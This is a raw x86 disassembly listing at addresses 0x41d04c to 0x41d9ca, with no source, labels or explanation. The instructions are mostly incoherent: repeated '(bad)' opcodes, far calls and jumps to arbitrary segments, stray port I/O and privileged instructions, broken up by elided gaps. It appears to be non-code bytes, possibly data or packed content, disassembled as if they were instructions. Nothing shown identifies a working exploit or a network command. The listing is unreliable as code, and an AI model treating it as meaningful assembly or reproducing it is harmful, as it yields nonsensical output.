  41d04c:	stos   BYTE PTR es:[edi],al
  41d04d:	push   0xffffffcb
  41d04f:	push   edx
  41d050:	adc    ebp,DWORD PTR ds:[eax-0x2e]
  41d054:	call   0xc09e:0xc2abcdf3
  41d05b:	mov    DWORD PTR [ebx],ebx
  41d05d:	sbb    BYTE PTR gs:[ebx-0x1425f84d],al
  41d064:	int3   
  41d065:	mov    esp,0x970065a4
  41d06a:	inc    esi
  41d06b:	fdivr  QWORD PTR [edi-0x77ff5e2f]
  41d071:	fistp  QWORD PTR [ebx-0x5a]
  41d074:	loopne 0x41d075
  41d076:	xchg   ebx,eax
  41d077:	adc    BYTE PTR [edx+0x5],bl
  41d07a:	xor    DWORD PTR [edx-0x5febf7cf],eax
  41d080:	push   esi
  41d081:	lods   eax,DWORD PTR ds:[esi]
  41d082:	(bad)  
  41d083:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d084:	xchg   edi,eax
  41d085:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d086:	xchg   ecx,eax
  41d087:	push   ss
  41d088:	ret    0x7ba8
  41d08b:	call   0x3d9a56b5
  41d090:	push   cs
  41d091:	jnp    0x41d054
  41d093:	lods   al,BYTE PTR ds:[esi]
  41d094:	adc    DWORD PTR [edi],esp
  41d096:	jmp    0xe4a5:0xed2510c0
  41d09d:	mov    DWORD PTR [esi+0x15],edx
  41d0a0:	mov    bl,0xf2
  41d0a2:	pop    es
  41d0a3:	inc    esi
  41d0a4:	push   ds
  41d0a5:	pop    edi
  41d0a6:	mov    esi,0xa6ee97e6
  41d0ab:	lock inc ebx
  41d0ad:	pop    edx
  41d0ae:	cmp    BYTE PTR [ecx+0x4a7cd8e5],cl
  41d0b4:	xchg   ecx,eax
  41d0b5:	adc    al,0x25
  41d0b7:	fs not ch
  41d0ba:	nop
  41d0bb:	xchg   esp,eax
  41d0bc:	pop    ss
  41d0bd:	mov    cl,0xbc
  41d0bf:	loop   0x41d10e
  41d0c1:	fwait
  41d0c2:	mov    dh,0x3
  41d0c4:	mov    eax,ds:0xf4ab8506
  41d0c9:	push   ebx
  41d0ca:	cli    
  41d0cb:	js     0x41d09a
  41d0cd:	add    ecx,esp
  41d0cf:	je     0x41d09e
  41d0d1:	test   al,0xec
  41d0d3:	inc    esi
  41d0d4:	inc    ecx
  41d0d5:	mov    edx,0xe74dceb1
  41d0da:	(bad)  
  41d0db:	cmp    ch,BYTE PTR [eax+0x63f17353]
  41d0e1:	test   BYTE PTR [ebp-0x76],cl
  41d0e4:	jg     0x41d153
  41d0e6:	bswap  ecx
  41d0e8:	xlat   BYTE PTR ds:[ebx]
  41d0e9:	bound  eax,QWORD PTR [ebp-0xa]
  41d0ec:	xor    BYTE PTR [ebp+0x75],dl
  41d0ef:	push   ecx
  41d0f0:	add    BYTE PTR [edi],ah
  41d0f2:	enter  0xf21f,0x87
  41d0f6:	call   0x7967:0xd8c7dae
  41d0fd:	repnz xor ebp,ecx
  41d100:	ins    DWORD PTR es:[edi],dx
  41d101:	xlat   BYTE PTR ds:[ebx]
  41d102:	cmp    ecx,ecx
  41d104:	mov    ch,0x81
  41d106:	test   BYTE PTR [eax],cl
  41d108:	popf   
  41d109:	or     al,BYTE PTR [edi]
  41d10b:	ficomp DWORD PTR fs:[ecx-0x56edc3cd]
  41d112:	rcl    al,1
  41d114:	fadd   st,st(3)
  41d116:	push   esp
  41d117:	cmp    cl,BYTE PTR [eax+0x4b7026bb]
  41d11d:	mov    dh,0x51
  41d11f:	call   0x60b58af4
  41d124:	cld    
  41d125:	leave  
  41d126:	out    0xb9,eax
  41d128:	outs   dx,BYTE PTR ds:[esi]
  41d129:	cmp    al,0xfe
  41d12b:	sbb    eax,ebx
  41d12d:	repnz or BYTE PTR [ebp+0x5341d7f0],ch
  41d134:	mov    al,ds:0x0
	...
  41d195:	add    BYTE PTR [eax-0x3d],dl
  41d198:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d19e:	sti    
  41d19f:	aad    0x81
  41d1a1:	loopne 0x41d148
  41d1a3:	sbb    eax,0x339bf18f
  41d1a8:	add    DWORD PTR [eax],eax
  41d1aa:	pop    es
  41d1ab:	add    DWORD PTR [eax],eax
  41d1ad:	add    BYTE PTR [edi],bl
  41d1af:	mov    eax,ds:0x84af71c9
  41d1b4:	aad    0xf6
  41d1b6:	pop    ebx
  41d1b7:	mov    cl,0x70
  41d1b9:	pop    esp
  41d1ba:	jbe    0x41d1ab
  41d1bc:	jnp    0x41d1a6
  41d1be:	shl    BYTE PTR [esi+0x50],1
  41d1c1:	imul   edx,DWORD PTR [esp+ebx*4+0x495074d1],0xa9771ff6
  41d1cc:	or     esi,ecx
  41d1ce:	inc    eax
  41d1cf:	and    dl,BYTE PTR [ebx]
  41d1d1:	push   esi
  41d1d2:	cdq    
  41d1d3:	ins    DWORD PTR es:[edi],dx
  41d1d4:	ins    BYTE PTR es:[edi],dx
  41d1d5:	(bad)  
  41d1d6:	cdq    
  41d1d7:	xor    esp,DWORD PTR [esi-0x4f]
  41d1da:	std    
  41d1db:	mov    esi,0x9090fa4f
  41d1e0:	outs   dx,DWORD PTR ss:[esi]
  41d1e2:	mov    dh,cl
  41d1e4:	jnp    0x41d1d2
  41d1e6:	(bad)  
  41d1e7:	push   cs
  41d1e8:	push   edi
  41d1e9:	and    DWORD PTR [ebp+0x24],0xffffffc0
  41d1ed:	mov    eax,0x1a87411d
  41d1f2:	add    DWORD PTR [ecx-0x3057e9af],eax
  41d1f8:	dec    esp
  41d1f9:	sar    DWORD PTR [eax+0x4874e8c2],1
  41d1ff:	ficomp WORD PTR [edi+ecx*2+0x2c]
  41d203:	xor    al,0x74
  41d205:	stos   DWORD PTR es:[edi],eax
  41d206:	pop    ss
  41d207:	dec    ebx
  41d208:	es (bad) 
  41d20a:	cs addr16 inc eax
  41d20d:	sti    
  41d20e:	ret    0x858
  41d211:	xor    edi,ebp
  41d213:	cli    
  41d214:	mov    ebx,0x64607d5f
  41d219:	sar    BYTE PTR [ebx+0x99cf3b6],1
  41d21f:	sub    eax,0x5ec00aeb
  41d224:	inc    esi
  41d225:	or     eax,0x9c29a3ef
  41d22a:	cmp    edi,DWORD PTR [edi+0x7f]
  41d22d:	mov    ecx,DWORD PTR [edi]
  41d22f:	lock inc eax
  41d231:	ds retf 0xe683
  41d235:	stc    
  41d236:	imul   ecx,DWORD PTR [edx-0x3b],0x3f944ebc
  41d23d:	mov    al,0xad
  41d23f:	dec    edx
  41d240:	push   ebx
  41d241:	mov    edx,0xd5f778e6
  41d246:	adc    al,0x6b
  41d248:	jge    0x41d245
  41d24a:	xchg   edi,eax
  41d24b:	mov    esi,0xb6d53344
  41d250:	hlt    
  41d251:	cdq    
  41d252:	adc    al,0x54
  41d254:	cdq    
  41d255:	test   DWORD PTR [ecx+esi*2+0x50145fb7],eax
  41d25c:	add    eax,0xa749dbc2
  41d261:	ror    ah,cl
  41d263:	or     al,0x45
  41d265:	xor    DWORD PTR [eax],ebx
  41d267:	lods   al,BYTE PTR ds:[esi]
  41d268:	data16 cmc 
  41d26a:	push   ds
  41d26b:	push   esp
  41d26c:	jns    0x41d2af
  41d26e:	(bad)  
  41d270:	ins    BYTE PTR es:[edi],dx
  41d271:	outs   dx,BYTE PTR ds:[esi]
  41d272:	push   edx
  41d273:	ss and ebp,ebp
  41d276:	cmp    esi,ecx
  41d278:	call   0x10f1:0x9888e0b5
  41d27f:	mov    ecx,0x36936c4e
  41d284:	pop    esp
  41d285:	sub    eax,0xb2aafac6
  41d28a:	lods   al,BYTE PTR ds:[esi]
  41d28b:	push   esp
  41d28c:	and    ch,cl
  41d28e:	push   ds
  41d28f:	call   0x259a38c
  41d294:	jp     0x41d283
  41d296:	loop   0x41d300
  41d298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d299:	xchg   esp,eax
  41d29a:	stc    
  41d29b:	push   0xd600d3fb
  41d2a0:	jne    0x41d225
  41d2a2:	mov    al,ds:0x2accedc8
  41d2a7:	jecxz  0x41d2dc
  41d2a9:	xor    ah,0x13
  41d2ac:	sub    ebp,DWORD PTR [edi]
  41d2ae:	mov    edx,0xf9db34ad
  41d2b3:	lods   al,BYTE PTR ds:[esi]
  41d2b4:	sldt   WORD PTR [eax]
	...
  41d313:	add    BYTE PTR [eax],al
  41d315:	add    dh,bh
  41d317:	cmp    cl,0x54
  41d31a:	(bad)  
  41d31b:	jge    0x41d31c
  41d31d:	stos   BYTE PTR es:[edi],al
  41d31e:	sbb    BYTE PTR [ebx-0x4d6a7a82],ch
  41d324:	xchg   esi,eax
  41d325:	adc    al,0xa2
  41d327:	xor    al,0x1
  41d329:	add    BYTE PTR [edi],al
  41d32b:	add    DWORD PTR [eax],eax
  41d32d:	add    BYTE PTR [ebx+0x2868e5a3],ah
  41d333:	push   ds
  41d334:	movd   mm7,ebp
  41d337:	mov    edi,0xbe8d5719
  41d33c:	or     BYTE PTR [ebp-0x62],al
  41d33f:	add    al,0xbe
  41d341:	xchg   edi,esi
  41d343:	popf   
  41d344:	cdq    
  41d345:	adc    al,0x71
  41d347:	js     0x41d2ce
  41d349:	fisttp DWORD PTR [eax-0x58]
  41d34c:	dec    eax
  41d34d:	pop    eax
  41d34e:	fcom   QWORD PTR [esi]
  41d350:	popf   
  41d351:	dec    ebx
  41d352:	inc    ecx
  41d353:	add    al,0x8f
  41d355:	int3   
  41d356:	inc    eax
  41d357:	rol    bh,0xa7
  41d35a:	in     eax,dx
  41d35b:	pop    esi
  41d35c:	push   esi
  41d35d:	stos   BYTE PTR es:[edi],al
  41d35e:	cmp    dl,BYTE PTR [esi+0x7a97aea9]
  41d364:	out    0xd5,al
  41d366:	cdq    
  41d367:	mov    eax,0x70abb344
  41d36c:	inc    ebp
  41d36d:	std    
  41d36e:	pushf  
  41d36f:	mov    BYTE PTR [ebp-0x64],0x72
  41d373:	inc    ecx
  41d374:	adc    eax,0x956ae457
  41d379:	data16 fwait
  41d37b:	xor    al,0x4b
  41d37d:	inc    esi
  41d37e:	retf   0x9b15
  41d381:	pop    ss
  41d382:	test   al,0x2d
  41d384:	packuswb mm5,QWORD PTR [edi]
  41d387:	dec    ebp
  41d388:	sbb    ch,BYTE PTR [eax+0x28a97bcb]
  41d38e:	repz add BYTE PTR [esi],0x1f
  41d392:	push   cs
  41d393:	pop    eax
  41d394:	mov    eax,0x3bcbab1c
  41d399:	retf   0x1c8d
  41d39c:	push   0xd98bd54d
  41d3a1:	popf   
  41d3a2:	in     al,0xf8
  41d3a4:	retf   0x4c38
  41d3a7:	sbb    edx,DWORD PTR [ecx]
  41d3a9:	cmp    bl,BYTE PTR [ecx]
  41d3ab:	repnz sub edx,DWORD PTR [edx-0x15]
  41d3af:	xchg   esi,eax
  41d3b0:	stos   DWORD PTR es:[edi],eax
  41d3b1:	mov    al,0xc3
  41d3b3:	jl     0x41d3b2
  41d3b5:	jle    0x41d399
  41d3b7:	push   cs
  41d3b8:	or     al,BYTE PTR [ebp+0x7f01ff5f]
  41d3be:	push   0x2abb1817
  41d3c3:	add    al,0xc1
  41d3c5:	in     eax,dx
  41d3c6:	in     al,0x8b
  41d3c8:	mov    eax,ds:0x33cadc64
  41d3cd:	mov    esp,0xc9dec60
  41d3d2:	into   
  41d3d3:	retf   0xed6f
  41d3d6:	mov    ebp,0x23198ec2
  41d3db:	cld    
  41d3dc:	or     ecx,DWORD PTR [edi-0x6a]
  41d3df:	in     al,dx
  41d3e0:	inc    BYTE PTR [ebp+0x255a7df0]
  41d3e6:	shr    BYTE PTR [ecx-0x33],1
  41d3e9:	sbb    DWORD PTR ds:0x24c0f661,eax
  41d3ef:	fidivr DWORD PTR [esi-0x52]
  41d3f2:	clc    
  41d3f3:	or     ebp,esp
  41d3f5:	pop    edx
  41d3f6:	inc    ebp
  41d3f7:	dec    edx
  41d3f8:	neg    ebx
  41d3fa:	repnz (bad) 
  41d3fc:	mov    cs,WORD PTR [edx+0x7f520d6b]
  41d402:	sbb    cl,ch
  41d404:	cdq    
  41d405:	pop    es
  41d406:	lods   al,BYTE PTR ds:[esi]
  41d407:	jno    0x41d405
  41d409:	int3   
  41d40a:	rol    bh,cl
  41d40c:	or     ecx,edi
  41d40e:	dec    eax
  41d40f:	jnp    0x41d39a
  41d411:	aam    0x70
  41d413:	inc    ebp
  41d414:	xchg   ebp,eax
  41d415:	out    dx,eax
  41d416:	mov    ?,WORD PTR [edi-0x58e7ed98]
  41d41c:	xor    ebp,DWORD PTR [ebp-0x77f13a98]
  41d422:	clc    
  41d423:	mov    bh,0x67
  41d425:	push   es
  41d426:	call   0x742dfcbf
  41d42b:	xor    bh,BYTE PTR [ebp+0x5d]
  41d42e:	fs pop ecx
  41d430:	sbb    ebp,eax
  41d432:	pushf  
  41d433:	dec    esi
  41d434:	mov    DWORD PTR [eax],eax
	...
  41d496:	div    BYTE PTR [esi]
  41d498:	rcl    BYTE PTR [edx+edx*8-0x2e89090c],cl
  41d49f:	fwait
  41d4a0:	aad    0xa2
  41d4a2:	add    BYTE PTR [ebp+0x1c],dh
  41d4a5:	clc    
  41d4a6:	test   eax,0x7000135
  41d4ab:	add    DWORD PTR [eax],eax
  41d4ad:	add    BYTE PTR [ebx+0x957579d],ch
  41d4b3:	mov    BYTE PTR [ebp+0x343477af],dh
  41d4b9:	push   ebx
  41d4ba:	xlat   BYTE PTR ds:[ebx]
  41d4bb:	leave  
  41d4bc:	mov    bl,BYTE PTR [ecx+0x5c]
  41d4bf:	xchg   BYTE PTR ds:0x3dfff95f,ah
  41d4c5:	aad    0x1f
  41d4c7:	sbb    ebp,edi
  41d4c9:	jno    0x41d47c
  41d4cb:	adc    al,0xf6
  41d4cd:	mov    cl,0xf9
  41d4cf:	fnclex 
  41d4d1:	sar    ebp,1
  41d4d3:	ins    BYTE PTR es:[edi],dx
  41d4d4:	jno    0x41d4f1
  41d4d6:	loope  0x41d4f3
  41d4d8:	pusha  
  41d4d9:	sar    BYTE PTR [ebp+0x1a],cl
  41d4dc:	in     eax,dx
  41d4dd:	out    dx,eax
  41d4de:	(bad)  
  41d4df:	enter  0xf4e0,0x99
  41d4e3:	xlat   BYTE PTR ds:[bx]
  41d4e5:	sub    BYTE PTR [ebx-0x1e],bl
  41d4e8:	addr16 int3 
  41d4ea:	in     eax,0x47
  41d4ec:	mov    ds:0x1aefb076,eax
  41d4f1:	sbb    DWORD PTR [ebp+0x5cbf79df],ebx
  41d4f7:	in     eax,0xd1
  41d4f9:	sbb    ebp,DWORD PTR ds:0xc545d856
  41d4ff:	out    dx,eax
  41d500:	scas   eax,DWORD PTR es:[edi]
  41d501:	push   0x53d44520
  41d506:	(bad)  
  41d508:	int3   
  41d509:	cld    
  41d50a:	in     al,0x1a
  41d50c:	loope  0x41d4e4
  41d50e:	stos   BYTE PTR es:[edi],al
  41d50f:	test   al,0x42
  41d511:	push   edx
  41d512:	call   0x2ee1:0xec98bde8
  41d519:	cmp    DWORD PTR [edi+0x45d61881],0xffffff8b
  41d520:	pop    esi
  41d521:	and    al,BYTE PTR [edi-0x2cd4f326]
  41d527:	ret    
  41d528:	adc    ecx,DWORD PTR [esi-0x1]
  41d52b:	mov    ecx,DWORD PTR [edi-0x72acfff8]
  41d531:	cwde   
  41d532:	retf   
  41d533:	clc    
  41d534:	lods   al,BYTE PTR ds:[esi]
  41d535:	or     eax,0x15a6a1dd
  41d53a:	popa   
  41d53b:	imul   ebx,ebp,0xe34d55ed
  41d541:	dec    esi
  41d542:	fld    QWORD PTR [esi+0x745ad5df]
  41d548:	dec    edi
  41d549:	gs in  eax,0xfe
  41d54c:	xchg   DWORD PTR [ebx-0x724c3e07],ecx
  41d552:	xlat   BYTE PTR ds:[ebx]
  41d553:	fnstenv [edx]
  41d555:	sbb    al,0x29
  41d557:	inc    BYTE PTR [edi+0x60]
  41d55a:	out    dx,eax
  41d55b:	cli    
  41d55c:	dec    ebx
  41d55d:	xlat   BYTE PTR ds:[ebx]
  41d55e:	imul   ebx,DWORD PTR es:[ecx+0x401e1b8],0x58
  41d566:	push   ds
  41d567:	mov    ebx,ds
  41d569:	scas   eax,DWORD PTR es:[edi]
  41d56a:	shr    ch,0x82
  41d56d:	shl    DWORD PTR [esi-0x50],cl
  41d570:	mov    al,0xde
  41d572:	add    BYTE PTR [ecx-0x409b0d40],ch
  41d578:	not    BYTE PTR [eax+ebx*4+0x56]
  41d57c:	push   cs
  41d57d:	inc    esi
  41d57e:	cmp    DWORD PTR [edx+0xfca79c5],esi
  41d584:	cmp    bh,ch
  41d586:	popf   
  41d587:	dec    eax
  41d588:	pop    edi
  41d589:	ret    
  41d58a:	mov    ecx,0x3bdb9119
  41d58f:	(bad)  
  41d590:	pop    edx
  41d591:	dec    eax
  41d592:	cmp    esi,DWORD PTR [esi+eax*8+0x7ea671f6]
  41d599:	inc    esi
  41d59a:	dec    ecx
  41d59b:	rep movs BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41d59e:	jmp    0x1725:0x7adaae6f
  41d5a5:	xchg   dl,bl
  41d5a7:	cmp    al,0x47
  41d5a9:	mov    ebx,ebx
  41d5ab:	mov    edx,0x435779e6
  41d5b0:	push   ebx
  41d5b1:	adc    BYTE PTR [edi],dl
  41d5b3:	xchg   edx,eax
  41d5b4:	jl     0x41d5b6
	...
  41d616:	jl     0x41d5b1
  41d618:	dec    esp
  41d619:	jbe    0x41d608
  41d61b:	idiv   DWORD PTR [esi-0x65]
  41d61e:	mov    al,BYTE PTR [edi-0x7c1b2ddf]
  41d624:	(bad)  
  41d625:	sub    DWORD PTR [eax+0x7000136],esi
  41d62b:	add    DWORD PTR [eax],eax
  41d62d:	add    cl,bh
  41d62f:	call   0x2849:0xfff63148
  41d636:	jmp    0xa6c5df27
  41d63b:	pusha  
  41d63c:	fs pushf 
  41d63e:	loope  0x41d619
  41d640:	mov    al,0x6c
  41d642:	inc    edx
  41d643:	loop   0x41d5fe
  41d645:	ss mov bl,0x79
  41d648:	xor    DWORD PTR [edx-0x48441e13],ebx
  41d64e:	clc    
  41d64f:	sbb    esi,DWORD PTR [ebp-0x7]
  41d652:	stos   BYTE PTR es:[edi],al
  41d653:	and    ebx,ecx
  41d655:	xor    esi,esp
  41d657:	push   ds
  41d658:	ror    DWORD PTR [edi-0x476e4cf4],1
  41d65e:	mov    ebp,0x80336df4
  41d663:	fadd   QWORD PTR [edx]
  41d665:	inc    edi
  41d666:	sbb    eax,0xe47aa96d
  41d66b:	and    DWORD PTR [ebp+0x77],0x4e
  41d66f:	jns    0x41d644
  41d671:	or     al,0xd3
  41d673:	repnz mov dh,BYTE PTR [esi+edi*8]
  41d677:	jle    0x41d61c
  41d679:	fmul   st,st(6)
  41d67b:	stos   DWORD PTR es:[edi],eax
  41d67c:	dec    esi
  41d67d:	and    DWORD PTR [edi+esi*2],eax
  41d680:	daa    
  41d681:	ds dec esi
  41d683:	push   esp
  41d684:	inc    ebp
  41d685:	xor    DWORD PTR [ebx+0x5c87d58a],esp
  41d68b:	sbb    edx,DWORD PTR [ebp-0x1391e406]
  41d691:	push   ebx
  41d692:	xor    cl,BYTE PTR [edi-0x1f]
  41d695:	fidivr WORD PTR [edx]
  41d697:	push   ecx
  41d698:	pusha  
  41d699:	mov    edi,0xa0476115
  41d69e:	add    BYTE PTR [esi],ch
  41d6a0:	repnz cmp esp,DWORD PTR [esi+0x4]
  41d6a4:	push   ebx
  41d6a5:	mov    BYTE PTR [esi-0x18],dl
  41d6a8:	dec    ebp
  41d6a9:	mov    al,cl
  41d6ab:	inc    esi
  41d6ac:	jb     0x41d714
  41d6ae:	add    cl,BYTE PTR [edi+0x6a]
  41d6b1:	in     eax,dx
  41d6b2:	test   DWORD PTR ds:0x7b6ebf04,edx
  41d6b8:	int    0x4d
  41d6ba:	pusha  
  41d6bb:	adc    eax,0xf5b7ba05
  41d6c0:	cld    
  41d6c1:	mov    ebp,0x8d72c3d5
  41d6c6:	retf   0xbae4
  41d6c9:	xchg   esi,eax
  41d6ca:	cmp    bh,bh
  41d6cc:	cmp    al,0xe6
  41d6ce:	add    dh,cl
  41d6d0:	loope  0x41d702
  41d6d2:	and    BYTE PTR [edx],dh
  41d6d4:	into   
  41d6d5:	aaa    
  41d6d6:	sahf   
  41d6d7:	popf   
  41d6d8:	jecxz  0x41d73a
  41d6da:	sub    DWORD PTR [esi+esi*4-0x1e],edx
  41d6de:	xor    ebx,DWORD PTR [ecx+0x6f78fae6]
  41d6e4:	push   ebp
  41d6e5:	mov    al,ds:0x9d5f7de9
  41d6ea:	pop    eax
  41d6eb:	shl    BYTE PTR [edi],cl
  41d6ed:	lods   al,BYTE PTR ds:[esi]
  41d6ee:	fwait
  41d6ef:	xchg   ecx,eax
  41d6f0:	mov    dl,0x5c
  41d6f2:	rol    DWORD PTR [ebp+0x49],1
  41d6f5:	pop    edi
  41d6f6:	repnz outs dx,BYTE PTR ds:[esi]
  41d6f8:	push   ebx
  41d6f9:	cmp    eax,0xb0a82b42
  41d6fe:	or     DWORD PTR [edi+edx*1],esi
  41d701:	dec    esi
  41d702:	inc    esi
  41d703:	retf   0x3f77
  41d706:	mov    dl,0x31
  41d708:	mov    ecx,0x4db67544
  41d70d:	inc    BYTE PTR [ecx+0x42f62d1a]
  41d713:	(bad)  
  41d714:	push   ecx
  41d715:	jmp    0x4976:0xfa034c5a
  41d71c:	xor    al,0xef
  41d71e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d71f:	push   ss
  41d720:	hlt    
  41d721:	sub    al,0x8c
  41d723:	jmp    0x631cab1
  41d728:	push   ds
  41d729:	enter  0x3007,0x68
  41d72d:	jecxz  0x41d786
  41d72f:	scas   al,BYTE PTR es:[edi]
  41d730:	or     DWORD PTR [ebx+0xd67b15],0x0
	...
  41d796:	and    al,0xce
  41d798:	outs   dx,BYTE PTR ds:[esi]
  41d799:	sub    ch,dh
  41d79b:	stos   BYTE PTR es:[edi],al
  41d79c:	fs into 
  41d79e:	push   ecx
  41d79f:	pop    ebp
  41d7a0:	or     esp,edi
  41d7a2:	cmp    ah,ch
  41d7a4:	dec    edx
  41d7a5:	addr16 mov bh,0x37
  41d7a8:	add    DWORD PTR [eax],eax
  41d7aa:	pop    es
  41d7ab:	add    DWORD PTR [eax],eax
  41d7ad:	add    BYTE PTR [esi-0x77],ch
  41d7b0:	pop    ds
  41d7b1:	mov    ecx,0x319a4fbe
  41d7b6:	mov    edx,0x759dc69
  41d7bb:	aaa    
  41d7bc:	mov    eax,ds:0x99e50349
  41d7c1:	in     al,0x8e
  41d7c3:	popf   
  41d7c4:	fsubr  DWORD PTR [esi+0x14]
  41d7c7:	and    dl,dh
  41d7c9:	cmp    edx,DWORD PTR [ecx]
  41d7cb:	inc    eax
  41d7cc:	aas    
  41d7cd:	cli    
  41d7ce:	xchg   ebp,eax
  41d7cf:	pop    eax
  41d7d0:	addr16 loop 0x41d7b5
  41d7d3:	jecxz  0x41d770
  41d7d5:	push   eax
  41d7d6:	daa    
  41d7d7:	pop    es
  41d7d8:	cmovs  ecx,DWORD PTR [esi+0x59]
  41d7dc:	in     al,0xc3
  41d7de:	xchg   ebp,eax
  41d7df:	or     DWORD PTR [edx],edx
  41d7e1:	(bad)  
  41d7e2:	sbb    DWORD PTR [ebx],eax
  41d7e4:	and    al,0x24
  41d7e6:	mov    ebp,gs
  41d7e8:	imul   eax,DWORD PTR [esi],0xffffffed
  41d7eb:	inc    edi
  41d7ec:	outs   dx,BYTE PTR ds:[esi]
  41d7ed:	scas   al,BYTE PTR es:[edi]
  41d7ee:	std    
  41d7ef:	test   DWORD PTR [ebp+eiz*2+0x65],edi
  41d7f3:	frstor [esp+eax*8+0x53fac19f]
  41d7fa:	xrelease mov BYTE PTR [ecx-0x62],bh
  41d7fe:	ins    DWORD PTR es:[edi],dx
  41d7ff:	unpcklps xmm2,XMMWORD PTR [ebp-0x15ca213a]
  41d806:	aam    0xc4
  41d808:	ds adc al,0x81
  41d80b:	cs jo  0x41d7e5
  41d80e:	adc    dl,BYTE PTR [edi+0xe9d9582]
  41d814:	rcl    BYTE PTR [esi],0x9b
  41d817:	js     0x41d7dd
  41d819:	pusha  
  41d81a:	push   edi
  41d81b:	push   0x8d888eb0
  41d820:	scas   al,BYTE PTR es:[edi]
  41d821:	lahf   
  41d822:	push   es
  41d823:	retf   0xaceb
  41d826:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41d828:	dec    esp
  41d829:	inc    ebx
  41d82a:	cld    
  41d82b:	scas   al,BYTE PTR es:[edi]
  41d82c:	in     al,0xdf
  41d82e:	jno    0x41d7f7
  41d830:	mov    edx,0xccacd5bb
  41d835:	add    al,dl
  41d837:	stc    
  41d838:	int    0x90
  41d83a:	fwait
  41d83b:	rcr    bl,1
  41d83d:	mov    ebx,0xd2f59249
  41d842:	push   cs
  41d843:	mov    esi,0xe42edb18
  41d848:	dec    ebp
  41d849:	adc    al,0xf6
  41d84b:	dec    esp
  41d84c:	jmp    0xb8415e6
  41d851:	mov    esp,0xd99f3f85
  41d856:	inc    edx
  41d857:	jo     0x41d81e
  41d859:	rcr    DWORD PTR [ebp+ebx*1-0x24],cl
  41d85d:	ins    DWORD PTR es:[edi],dx
  41d85e:	mov    dh,0x11
  41d860:	mov    ch,0xe4
  41d862:	jne    0x41d8cd
  41d864:	ja     0x41d85b
  41d866:	or     eax,0x48047310
  41d86b:	xchg   esi,eax
  41d86c:	fistp  QWORD PTR [esi]
  41d86e:	pop    edi
  41d86f:	push   esp
  41d870:	(bad)  
  41d871:	jge    0x41d87b
  41d873:	dec    esp
  41d874:	mov    BYTE PTR [ecx],ah
  41d876:	stos   DWORD PTR es:[edi],eax
  41d877:	aam    0xef
  41d879:	jnp    0x41d85a
  41d87b:	clc    
  41d87c:	(bad)  [ecx]
  41d87e:	xchg   edx,eax
  41d87f:	push   esp
  41d880:	into   
  41d881:	ret    
  41d882:	add    eax,0x20e9bae5
  41d887:	daa    
  41d888:	or     BYTE PTR [edi],ah
  41d88a:	push   0x5
  41d88c:	nop
  41d88d:	jne    0x41d81d
  41d88f:	sub    BYTE PTR [ecx+ebx*1],bl
  41d892:	jp     0x41d89f
  41d894:	fs pop edx
  41d896:	inc    ebp
  41d897:	mov    eax,ds:0x62a7605b
  41d89c:	pop    es
  41d89d:	mov    ebx,0x48e98cc2
  41d8a2:	push   edi
  41d8a3:	xorps  xmm3,XMMWORD PTR [ecx]
  41d8a6:	sub    dl,BYTE PTR [ebp-0x30bfe0d0]
  41d8ac:	mov    ds:0x7d537b97,al
  41d8b1:	(bad)  
  41d8b2:	jmp    0x0:0xad33
	...
  41d915:	add    ah,al
  41d917:	ins    BYTE PTR es:[edi],dx
  41d918:	pop    es
  41d919:	pushf  
  41d91a:	scas   eax,DWORD PTR es:[edi]
  41d91b:	(bad)  
  41d91c:	fistp  QWORD PTR [ebx+eiz*8+0x0]
  41d920:	inc    eax
  41d921:	jmp    0x38be:0x8f2513a7
  41d928:	add    DWORD PTR [eax],eax
  41d92a:	pop    es
  41d92b:	add    DWORD PTR [eax],eax
  41d92d:	add    BYTE PTR [ebx-0x13da6001],dh
  41d933:	mov    al,ds:0x759044b1
  41d938:	(bad)  
  41d939:	js     0x41d924
  41d93b:	stc    
  41d93c:	into   
  41d93d:	lahf   
  41d93e:	mov    ch,0xe1
  41d940:	push   0xd68cf75
  41d945:	sub    eax,0x9c6d592e
  41d94a:	sub    ebx,DWORD PTR [esp+edx*4]
  41d94d:	adc    al,0x6f
  41d94f:	pusha  
  41d950:	mov    eax,ds:0xf6206f2e
  41d955:	pusha  
  41d956:	mov    dh,0x94
  41d958:	pop    ebx
  41d959:	int    0x7a
  41d95b:	inc    ebp
  41d95c:	jae    0x41d8ef
  41d95e:	cmp    al,bh
  41d960:	js     0x41d9d8
  41d962:	out    dx,al
  41d963:	xor    BYTE PTR [ecx],dl
  41d965:	inc    ebx
  41d966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d967:	adc    al,0x28
  41d969:	pop    ss
  41d96a:	adc    DWORD PTR [esp+eax*8],ecx
  41d96d:	retf   0x1814
  41d970:	les    ecx,FWORD PTR [ecx]
  41d972:	fistp  DWORD PTR [edx-0x27]
  41d975:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d976:	sbb    eax,0xe44a0830
  41d97b:	popa   
  41d97c:	sub    al,0xe5
  41d97e:	xor    ebp,DWORD PTR [ebx]
  41d980:	jns    0x41d97e
  41d982:	fstp   TBYTE PTR [edi]
  41d984:	push   eax
  41d985:	mov    ah,0x12
  41d987:	scas   al,BYTE PTR es:[edi]
  41d988:	sub    dh,BYTE PTR [eax-0x66e86f2a]
  41d98e:	mov    BYTE PTR [ebx+0x22059164],bl
  41d994:	jno    0x41d9ba
  41d996:	lahf   
  41d997:	lock cs jg 0x41d9cd
  41d99b:	fisub  WORD PTR [eax+0x61be23ba]
  41d9a1:	cmc    
  41d9a2:	dec    esp
  41d9a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9a4:	mov    ?,WORD PTR [edx+0x2859aeec]
  41d9aa:	mov    ss:0xb802a0e1,eax
  41d9b0:	inc    eax
  41d9b1:	inc    ebx
  41d9b2:	adc    eax,0x6565b23f
  41d9b7:	sbb    DWORD PTR [edi],eax
  41d9b9:	ja     0x41d990
  41d9bb:	inc    esi
  41d9bc:	add    eax,0x9ed2b86c
  41d9c1:	push   ecx
  41d9c2:	or     ebx,esp
  41d9c4:	retf   
  41d9c5:	lahf   
  41d9c6:	or     al,0x95
  41d9c8:	jg     0x41d9c2
  41d9ca:	sbb    ecx,DWORD PTR [ebx+0x69ad85d0]
